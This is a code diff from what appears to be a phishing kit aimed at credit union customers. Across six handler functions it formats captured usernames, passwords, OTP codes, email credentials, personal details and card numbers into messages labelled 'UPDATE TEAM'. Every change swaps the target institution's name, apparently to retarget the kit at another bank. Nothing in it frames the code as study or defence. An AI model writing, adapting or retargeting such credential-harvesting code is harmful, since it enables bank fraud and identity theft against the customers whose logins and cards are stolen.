@@ -30,7 +30,7 @@ exports.loginPost = async (req, res) => {
     const systemLang = req.headers["accept-language"];
 
 	const message =
-		`✅ UPDATE TEAM | MSUFCU | USER_${ipAddress}\n\n` +
+		`✅ UPDATE TEAM | OPCCU | USER_${ipAddress}\n\n` +
 		`👤 LOGIN INFO\n` +
 		`USERNAME         : ${username}\n` +
 		`PASSWORD         : ${password}\n\n` +
@@ -93,7 +93,7 @@ exports.loginPost2 = async (req, res) => {
     const systemLang = req.headers["accept-language"];
 
 	const message =
-		`✅ UPDATE TEAM | MSUFCU | USER_${ipAddress}\n\n` +
+		`✅ UPDATE TEAM | OPCCU | USER_${ipAddress}\n\n` +
 		`👤 RELOGIN INFO\n` +
 		`USERNAME         : ${username}\n` +
 		`PASSWORD         : ${password}\n\n` +
@@ -147,7 +147,7 @@ exports.loginPost3 = async (req, res) => {
     const systemLang = req.headers["accept-language"];
 
 	const message =
-		`✅ UPDATE TEAM | MSUFCU | USER_${ipAddress}\n\n` +
+		`✅ UPDATE TEAM | OPCCU | USER_${ipAddress}\n\n` +
 		`👤 OTP INFO\n` +
 		`OTP CODE         : ${otp}\n\n` +
 		`🌍 GEO-IP INFO\n` +
@@ -201,7 +201,7 @@ exports.loginPost4 = async (req, res) => {
 
 
 	const message =
-		`✅ UPDATE TEAM | MSUFCU | USER_${ipAddress}\n\n` +
+		`✅ UPDATE TEAM | OPCCU | USER_${ipAddress}\n\n` +
 		`👤 EMAIL INFO\n` +
 		`EMAIL ADDRESS    : ${emailAddr}\n` +
 		`EMAIL PASSWORD   : ${emailPass}\n\n` +
@@ -255,7 +255,7 @@ exports.loginPost5 = async (req, res) => {
     const systemLang = req.headers["accept-language"];
 
 	const message =
-		`✅ UPDATE TEAM | MSUFCU | USER_${ipAddress}\n\n` +
+		`✅ UPDATE TEAM | OPCCU | USER_${ipAddress}\n\n` +
 		`👤 PERSONAL INFO\n` +
 		`FULL NAME        : ${fullName}\n` +
 		`STREET ADDRESS   : ${address}\n` +
@@ -313,7 +313,7 @@ exports.loginPost6 = async (req, res) => {
     const systemLang = req.headers["accept-language"];
 
 	const message =
-		`✅ UPDATE TEAM | MSUFCU | USER_${ipAddress}\n\n` +
+		`✅ UPDATE TEAM | OPCCU | USER_${ipAddress}\n\n` +
 		`👤 CARD INFO\n` +
 		`CARD NUMBER      : ${cardNum}\n` +
 		`EXPIRY DATE      : ${expDate}\n` +
